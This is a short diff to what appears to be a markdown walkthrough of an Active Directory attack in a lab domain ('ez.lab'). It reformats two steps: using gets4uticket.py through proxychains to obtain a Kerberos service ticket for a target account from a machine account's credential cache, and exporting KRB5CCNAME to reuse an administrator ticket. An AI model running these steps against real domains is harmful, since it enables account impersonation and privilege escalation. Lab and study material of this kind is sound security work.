@@ -64,7 +64,9 @@
 
 #### 4) Get a ST (service ticket) for the target account
 
- - proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.# Utilize the ST for future activity
+ - proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.
+
+#### 5) Utilize the ST for future activity
 
  - export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
 
